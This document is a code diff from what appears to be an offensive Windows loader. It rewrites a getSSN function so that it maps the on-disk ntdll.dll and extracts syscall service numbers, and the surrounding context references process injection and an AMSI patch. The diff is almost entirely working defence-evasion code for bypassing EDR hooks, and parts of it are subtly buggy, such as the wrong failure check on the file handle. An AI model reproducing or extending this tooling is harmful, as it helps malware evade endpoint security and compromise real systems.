@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include "injection.h"
 #include "config.h"
+DWORD g_ssn = 0;
 
 
 
@@ -161,16 +162,51 @@ BOOL AmsiPatch() {
 
 }
 
-VOID getSSN(char* funcName) {
+DWORD getSSN(char* funcName) {
 
-	if (EdrHookerCheck) { printf("test!!\n"); }
+	HANDLE hNtdll = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
+		GENERIC_READ,
+		FILE_SHARE_READ, NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (hNtdll == NULL) {
+		printf("[-] Failed to open on-disk ntdll");
+		return 0;
+	}
+
+	HANDLE hMappedNtdll = CreateFileMappingW(hNtdll, NULL, PAGE_READONLY, 0, 0, NULL);
+
+	if (hMappedNtdll == NULL) {
+		printf("[-] Failed to map on-disk ntdll");
+		return 0;
+	}
+
+	// use this
+	PVOID pNtdll = MapViewOfFile(hMappedNtdll, FILE_MAP_READ, 0, 0, 0);
+
+	if (pNtdll == NULL) {
+		printf("[-] Failed to map view of on-disk ntdll");
+		return 0;
+	}
+
+	PVOID func_Addr = manual_procaddress((HMODULE)pNtdll, funcName);
+
+	if (func_Addr == NULL) {
+		UnmapViewOfFile(pNtdll);
+		CloseHandle(hMappedNtdll);
+		CloseHandle(hNtdll);
+		return NULL; 
+	}
+
+	DWORD ssn = *(DWORD*)((BYTE*)func_Addr + 4);
+
+	// cleanup
+	UnmapViewOfFile(pNtdll);
+	CloseHandle(hMappedNtdll);
+	CloseHandle(hNtdll);
 
 
-	// grab ntdll from disk use that to grab ssn from function and return
-
-
-	//DWORD ssn = *(DWORD*)((BYTE*)funcName + 4);
-
-
+	return ssn;
 
 }
